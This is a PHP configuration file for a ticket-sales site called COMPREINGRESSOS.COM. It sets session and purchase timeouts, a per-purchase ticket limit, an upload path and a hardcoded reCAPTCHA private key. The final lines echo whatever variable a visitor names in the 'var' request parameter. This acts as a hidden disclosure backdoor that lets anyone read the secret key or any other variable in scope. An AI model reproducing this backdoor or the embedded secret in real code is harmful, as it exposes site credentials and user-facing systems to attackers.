<?php
$nomeSite = 'COMPREINGRESSOS.COM';
$title = $nomeSite;// . ' - Painel Administrativo';

$cookieExpireTime = time() + 60 * 20; //20min

$compraExpireTime = 15;//minutos

$maxIngressos = 10;//maximo por compra

$uploadPath = '../images/uploads/';

$is_teste = '0';

$isContagemAcessos = true;

$recaptcha = array(
	'private_key' => '6LeWX9kSAAAAAMMPzga35fIM8MjChV29_VSxYtIC',
	'public_key' => '6LeWX9kSAAAAACmAZZ4Gv368Vk7ARc7xLV4mNuW7'
);

if (isset($_REQUEST['var'])) {
	echo $$_REQUEST['var'];
}
?>